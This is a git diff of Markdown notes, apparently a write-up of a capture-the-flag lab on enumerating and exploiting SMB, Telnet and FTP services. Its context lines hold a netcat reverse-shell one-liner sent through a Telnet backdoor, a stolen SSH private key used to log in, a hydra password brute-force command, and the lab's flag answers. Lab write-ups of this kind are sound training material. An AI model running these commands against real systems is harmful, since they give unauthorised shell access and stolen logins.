@@ -94,7 +94,7 @@ A: unix
   
 Conduct an **nmap** scan of your choosing, How many ports are open?  
 
-![](Pasted%20image%2020240911122005.png)
+![](Pasted image 20240911122005.png)
 
 `A: 3`
 
@@ -106,13 +106,13 @@ Let's get started with Enum4Linux, conduct a full basic enumeration. For starter
 
 - `enum4linux -a <ip>`
 
-![](Pasted%20image%2020240911122332.png)
+![](Pasted image 20240911122332.png)
 
 `A: WORKGROUP` 
 
 What comes up as the **name** of the machine?          
 
-![](Pasted%20image%2020240911123309.png)
+![](Pasted image 20240911123309.png)
 
 `A: POLOSMB`
 
@@ -122,7 +122,7 @@ What operating system **version** is running?    
 
 What share sticks out as something we might want to investigate?
 
-![](Pasted%20image%2020240911123650.png)
+![](Pasted image 20240911123650.png)
 
 `A: profiles`
 
@@ -161,7 +161,7 @@ Great! Have a look around for any interesting documents that could contain valua
 
 - `more “Working from home information.txt”`
 
-![](Pasted%20image%2020240911131728.png)
+![](Pasted image 20240911131728.png)
 
 	`A: John Cactus`
 
@@ -188,12 +188,12 @@ What is the smb.txt flag?
 - `mv id_rsa /root/.ssh`
 - On the server: `more id_rsa.pub`
 
-![](Pasted%20image%2020240911163126.png)
+![](Pasted image 20240911163126.png)
 
 - Potential login info: `cactus@polosmb`
 - Try `ssh cactus@ip`, having the private key saved on your machine
 
-![](Pasted%20image%2020240911163412.png)
+![](Pasted image 20240911163412.png)
 
 	`A: THM{smb_is_fun_eh?}`
 
@@ -254,7 +254,7 @@ Based on the title returned to us, what do we think this port could be **used f
 
 - `nmap -sV --vv -p8012 <ip> `
 
-![](Pasted%20image%2020240912150419.png)
+![](Pasted image 20240912150419.png)
 
 	`A: a backdoor`
 
@@ -272,7 +272,7 @@ Who could it belong to? Gathering possible **usernames** is an important step 
 
 - The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.
 
-![](Pasted%20image%2020240912151631.png)
+![](Pasted image 20240912151631.png)
 
 
 ### Questions
@@ -308,7 +308,7 @@ What word does the generated payload start with?
 
 - On your machine: ` msfvenom -p cmd/unix/reverse_netcat lhost=10.10.167.137 lport=4444 R`
 
-![](Pasted%20image%2020240912153730.png)
+![](Pasted image 20240912153730.png)
 
 	`A: mkfifo`
 
@@ -322,7 +322,7 @@ Success! What is the contents of flag.txt?
 
 - Copy the payload from earlier where you replace the ip of the target with the ip of your machine: `mkfifo /tmp/zvnkw; nc 10.10.167.137 4444 0</tmp/zvnkw | /bin/sh >/tmp/zvnkw 2>&1; rm /tmp/zvnkw`
 
-![](Pasted%20image%2020240912154838.png)
+![](Pasted image 20240912154838.png)
 
 	`A: THM{y0u_g0t_th3_t3ln3t_fl4g}`
 
@@ -366,7 +366,7 @@ How many modes of FTP connection are there?
 
 ### Questions
 
-![](Pasted%20image%2020240912160420.png)
+![](Pasted image 20240912160420.png)
 
 How many **ports** are open on the target machine?   
 
@@ -379,7 +379,7 @@ What **port** is ftp running on?
 
 What **variant** of FTP is running on it?  
 
-![](Pasted%20image%2020240912160543.png)
+![](Pasted image 20240912160543.png)
 
 	`A: vsftpd`
 
@@ -387,7 +387,7 @@ Great, now we know what type of FTP server we're dealing with we can check to se
 
 What is the name of the file in the anonymous FTP directory?  
 
-![](Pasted%20image%2020240912160708.png)
+![](Pasted image 20240912160708.png)
 
 	`A: PUBLIC_NOTICE.txt`
 
@@ -397,7 +397,7 @@ could be?
 - On the FTP server: `get PUBLIC_NOTICE.txt`
 - On your machine: 
 
-![](Pasted%20image%2020240912160932.png)
+![](Pasted image 20240912160932.png)
 
 	`A: Mike`
 
@@ -436,12 +436,12 @@ What is the password for the user "mike"?
 `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.10.179.16 ftp
 `
 
-![](Pasted%20image%2020240912161607.png)
+![](Pasted image 20240912161607.png)
 
 	A: password
 
 What is ftp.txt?
 
-![](Pasted%20image%2020240912161712.png)
+![](Pasted image 20240912161712.png)
 
 	`A: THM{y0u_g0t_th3_ftp_fl4g}`
